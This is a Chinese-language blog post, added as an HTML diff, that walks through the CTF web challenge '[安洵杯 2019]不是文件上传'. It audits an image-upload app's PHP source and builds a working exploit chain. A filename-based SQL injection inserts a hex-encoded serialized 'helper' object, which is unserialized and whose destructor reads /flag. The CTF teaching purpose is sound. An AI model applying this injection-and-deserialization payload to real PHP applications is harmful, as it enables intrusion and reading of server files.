@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>[安洵杯 2019]不是文件上传 | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[安洵杯 2019]不是文件上传首先看到梳理应用逻辑  有上传文件入口 可以查看文件上传的结果 show.php 可以删除所有上传的文件 show.php 提示只能保存文件名和路径   查看图片功能尚未完成，目前只能保存您图片名称的内容。 我希望你能原谅我和我的同事，我正在努力改进。 想尝试找出文件实际保存位置，没找到，再扫一下目录吧 同时尝试上传其他类型文件，发现好像只能上传图像类文件 目录扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[安洵杯 2019]不是文件上传">
+<meta property="og:url" content="https://rock718.github.io.git/2022/02/15/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="[安洵杯 2019]不是文件上传首先看到梳理应用逻辑  有上传文件入口 可以查看文件上传的结果 show.php 可以删除所有上传的文件 show.php 提示只能保存文件名和路径   查看图片功能尚未完成，目前只能保存您图片名称的内容。 我希望你能原谅我和我的同事，我正在努力改进。 想尝试找出文件实际保存位置，没找到，再扫一下目录吧 同时尝试上传其他类型文件，发现好像只能上传图像类文件 目录扫描">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rock718.github.io.git/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220214214947433.png">
+<meta property="og:image" content="https://rock718.github.io.git/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220214221649356.png">
+<meta property="og:image" content="https://rock718.github.io.git/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220215200738681.png">
+<meta property="og:image" content="https://rock718.github.io.git/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220215200853905.png">
+<meta property="article:published_time" content="2022-02-15T12:15:23.000Z">
+<meta property="article:modified_time" content="2022-02-15T12:15:23.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rock718.github.io.git/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220214214947433.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-安洵杯-2019-不是文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [安洵杯 2019]不是文件上传
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>首先看到梳理应用逻辑</p>
+<ul>
+<li>有上传文件入口</li>
+<li>可以查看文件上传的结果 show.php</li>
+<li>可以删除所有上传的文件</li>
+<li>show.php 提示只能保存文件名和路径</li>
+</ul>
+<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220214214947433.png" alt="image-20220214214947433"></p>
+<p>查看图片功能尚未完成，目前只能保存您图片名称的内容。 我希望你能原谅我和我的同事，我正在努力改进。</p>
+<p>想尝试找出文件实际保存位置，没找到，再扫一下目录吧</p>
+<p>同时尝试上传其他类型文件，发现好像只能上传图像类文件</p>
+<p>目录扫描出config.txt</p>
+<p>内容只有<code>&lt;h1&gt;This is foot&lt;h2&gt;</code></p>
+<p>结合题目，问题应该不是在文件上传处，再找找</p>
+<p>看wp，发现需要找一下系统的源码</p>
+<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220214221649356.png" alt="image-20220214221649356"></p>
+<p>在github上搜索wowouploadimage</p>
+<p>分析源码</p>
+<ul>
+<li>index.html是首页</li>
+<li>upload.php负责上传文件，其引用了helper.php</li>
+<li>show.php负责查询数据库来显示上传结果，也引用了helper.php</li>
+<li>helper.php负责将关于图像的属性信息插入数据库的images表</li>
+</ul>
+<p>通读代码首先注意到helper.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">    <span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">    <span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// var_dump($my_ext);</span></span><br><span class="line">    <span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在<code>$array[&quot;attr&quot;] = serialize($my_ext);</code>序列化</p>
+<p>但此处的<code>$array[&quot;attr&quot;]</code>为从图像中读取的宽高信息，无法控制。</p>
+<p>show.php中对存入数据库的字段进行了读取并反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">                <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">                <span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键点在于helper.php中的<code>check()</code>，其没有对sql注入进行防护</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 新文件名由MD5生成</span></span><br><span class="line">    <span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 白名单检查文件后缀</span></span><br><span class="line">    <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">// 返回文件信息数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回数组中的元素在后面的函数中被拼接并插入数据库</p>
+<p>其中filename是MD5值，ext是文件后缀，path是<code>/pic/</code>下的MD5文件名，title是去掉了文件后缀的文件名</p>
+<p>只有title是用户直接可控的，且程序在此处未作过滤，后面又将该字段拼接sql语句，存在注入。</p>
+<p>结合注入，在反序列化时可传入helper对象，利用helper对象的析构函数实现文件读取。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">        <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment"># Read some config html</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先定义一个用于传入的helper对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(hex)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure>
+
+<p>对文件名进行注入</p>
+<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220215200738681.png" alt="image-20220215200738681"></p>
+<p>插入的sql语句相当于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (`title`,`filename`,`ext`,`path`,`attr`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span>)#<span class="string">&#x27;,&#x27;</span><span class="number">30</span>a5611102e7e6d2.png<span class="string">&#x27;,&#x27;</span>png<span class="string">&#x27;,&#x27;</span>pic<span class="operator">/</span><span class="number">30</span>a5611102e7e6d2.png<span class="string">&#x27;,&#x27;</span>a:<span class="number">2</span>:&#123;s:<span class="number">5</span>:&quot;width&quot;;i:<span class="number">32</span>;s:<span class="number">6</span>:&quot;height&quot;;i:<span class="number">32</span>;&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220215200853905.png" alt="image-20220215200853905"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2022/02/15/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl9y4cx9s005m24fy4lple3lo" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/16/HarekazeCTF2019-Avatar-Uploader-1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          [HarekazeCTF2019]Avatar Uploader 1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/02/13/CSAWQual-2019-Web-Unagi/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">[CSAWQual 2019]Web_Unagi</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
